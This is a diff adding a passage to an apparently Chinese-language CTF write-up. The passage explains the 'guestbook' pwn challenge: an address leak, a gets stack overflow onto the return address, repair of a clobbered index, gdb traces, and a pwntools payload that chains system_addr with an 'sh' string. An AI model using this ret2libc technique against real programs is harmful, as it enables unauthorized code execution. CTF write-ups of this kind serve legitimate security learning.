@@ -37,6 +37,78 @@ r.interactive()
 ```
 
 
+## guestbook
+
+直接read第6個，可以把一些dest渣渣和system給leak出來
+
+然後直接change name去改dest，因為gets可以讀無限長
+
+所以理論上可以直接蓋到return address
+
+但要注意中間有東西會被蓋壞 (strcpy那邊)
+
+跟一下可以發現
+
+這邊應該是index被蓋掉了
+
+蓋回0就行
+
+```
+0x5655597d <main+443>:   call   0x56555550 <gets@plt>
+0x56555982 <main+448>:    add    esp,0x4
+0x56555985 <main+451>: mov    eax,DWORD PTR [ebp-0x34]
+=> 0x56555988 <main+454>:  mov    eax,DWORD PTR [ebp+eax*4-0x2c]
+0x5655598c <main+458>:  lea    edx,[ebp-0x98]
+0x56555992 <main+464>:   push   edx
+0x56555993 <main+465>:    push   eax
+0x56555994 <main+466>: call   0x56555570 <strcpy@plt>
+```
+
+index的offset的話就是 0x98 - 0x34
+
+
+除了這邊，還有一個地方會爛：
+
+正常：
+
+```
+   0x5655598c <main+458>:       lea    edx,[ebp-0x98]
+   0x56555992 <main+464>:       push   edx
+   0x56555993 <main+465>:       push   eax
+=> 0x56555994 <main+466>:       call   0x56555570 <strcpy@plt>
+   0x56555999 <main+471>:       add    esp,0x8
+   0x5655599c <main+474>:       jmp    0x565559b3 <main+497>
+   0x5655599e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
+   0x565559a2 <main+480>:       jmp    0x565559b3 <main+497>
+Guessed arguments:
+     arg[0]: 0x56558008 --> 0x61 ('a')
+     arg[1]: 0xffffd540 --> 0xffff0078 --> 0x0
+```
+
+不正常：
+
+```
+   0x5656e98c <main+458>:       lea    edx,[ebp-0x98]
+   0x5656e992 <main+464>:       push   edx
+   0x5656e993 <main+465>:       push   eax
+=> 0x5656e994 <main+466>:       call   0x5656e570 <strcpy@plt>
+   0x5656e999 <main+471>:       add    esp,0x8
+   0x5656e99c <main+474>:       jmp    0x5656e9b3 <main+497>
+   0x5656e99e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
+   0x5656e9a2 <main+480>:       jmp    0x5656e9b3 <main+497>
+Guessed arguments:
+     arg[0]: 0x0                           <============   這個炸惹
+     arg[1]: 0xff9675b0 --> 0x0
+```
+
+
+改用 r.sendline("\x00"*108 + p32(0xdeadbeef)*1 + p32(0) * 11 + p32(system_addr) + p32(sh) * 2) 後：
+
+Guessed arguments:
+     arg[0]: 0xdeadbeef                    <============  108 ~ 112的位置
+     arg[1]: 0xffbb7ad0 --> 0x0
+
+
 ## The nerver ending crypto
 
 英文+特殊符號的凱薩加密
